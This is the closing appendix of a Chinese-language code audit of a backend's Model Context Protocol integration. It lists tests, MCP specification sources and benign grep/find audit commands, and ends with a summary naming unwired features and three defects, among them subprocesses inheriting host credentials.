- `backend/qknow-mcp/qknow-mcp-client/target/surefire-reports/tech.qiantong.qknow.mcp.McpEcosystemContractTest.txt`：`Tests run: 4, Failures: 0, Errors: 0`（历史执行产物，非本次运行）。
- MCP 相关测试文件 46 个（`find . -path "*src/test*" -name "*.java" | xargs grep -l mcp`），关键：`Phase46McpContractTest`、`Phase46ClawCodeMcpHardenedContractTest`、`Phase90McpOrchestrationContractTest`、`Phase102TwoStageMcpRouterContractTest`、`Phase103McpIntegrationTest`、`Phase107McpServerExportIntegrationTest`、`Phase122McpSecuritySandboxContractTest`、`Phase147McpVoronoiRouterContractTest`、`McpHttpGatewayAndValidationTest`、`McpTwoPhaseFullLoopContractTest`。

#### A.3 外部规范（抓取日期 2026-10-19）

1. Model Context Protocol — Specification 首页：<https://modelcontextprotocol.io/specification/>（HTTP 200，页面内容指向最新版本 **2026-07-28**；JSON-RPC 2.0；Hosts/Clients/Servers；Resources/Prompts/Tools；Client Elicitation；Utilities 含 Progress tracking / Cancellation / Error reporting；Extensions 含 Tasks、Skills over MCP、MCP Apps；Security and Trust & Safety 章节）。
2. Model Context Protocol — Lifecycle（2025-06-18）：<https://modelcontextprotocol.io/specification/2025-06-18/basic/lifecycle>（HTTP 200；`initialize` MUST 为第一次交互；client MUST 发送 `protocolVersion`/`capabilities`/`clientInfo`；server MUST 返回 capabilities；含 Version Negotiation / Timeouts / Error Handling 小节）。
3. Model Context Protocol — Transports（2025-06-18）：<https://modelcontextprotocol.io/specification/2025-06-18/basic/transports>（HTTP 200；stdio 换行分隔、`MUST NOT` 内嵌换行、server `MUST NOT` 污染 stdout、日志走 stderr；Streamable HTTP 替换 2024-11-05 的 HTTP+SSE；单 endpoint 支持 POST+GET；`Origin` 校验 MUST；localhost 绑定 SHOULD；`Mcp-Session-Id`；Resumability and Redelivery；`MCP-Protocol-Version` 头）。
4. Model Context Protocol — Tools（2025-06-18）：<https://modelcontextprotocol.io/specification/2025-06-18/server/tools>（HTTP 200；tools capability MUST；Listing/Calling/List Changed Notification；Data Types：Text/Image/Audio/Resource Links/Embedded Resources/Structured Content/Output Schema；Error Handling；Security Considerations；SHOULD 保持 human-in-the-loop）。
5. 版本校验说明：<https://modelcontextprotocol.io/specification/2025-06-18/basic/versioning> 返回 **HTTP 404**（该 URL 不存在），版本协商以 Lifecycle 页的 Version Negotiation 小节为准；此项记为**部分验证**。

#### A.4 本次审计的方法命令（可复现）

```bash
# 范围与规模
find backend/qknow-mcp -path "*/src/main/*" -name "*.java" | wc -l          # 79
find backend/qknow-mcp -path "*/src/main/*" -name "*.java" -exec cat {} + | wc -l  # 7091
find backend/qknow-hermes/qknow-hermes-core/src/main/java/tech/qiantong/qknow/hermes/tool -name "*.java" | wc -l  # 65

# 装配关系（判断孤岛）
grep -rn --include=*.java "<类名>" backend | grep -v /tests/ | grep -v <自身定义文件>

# 组件扫描边界
sed -n '19,28p' backend/qknow-server/src/main/java/tech/qiantong/qknow/server/QKnowApplication.java

# 协议版本一致性
grep -rn --include=*.java "protocolVersion" backend/qknow-mcp backend/qknow-hermes

# 配置面
grep -rn -i "mcp" --include=*.yml --include=*.yaml --include=*.properties backend/qknow-server/src/main/resources backend/qknow-module-*/src/main/resources
```

---

**报告结论摘要**：MCP 侧目前只有"stdio/HTTP 客户端 + `tools/list` + `tools/call` + 轻量 schema 校验"是真实可用的；语义路由、四防线、零信任沙箱、幂等编排、审批 HITL、审计回执六项均为"代码存在但未装配或实现与声明不符"。最需要在对外表述与下一阶段契约中处理的三件事是：**D01 语义路由为零向量、D02 Provider 为假数据、D03 子进程继承宿主凭据**。
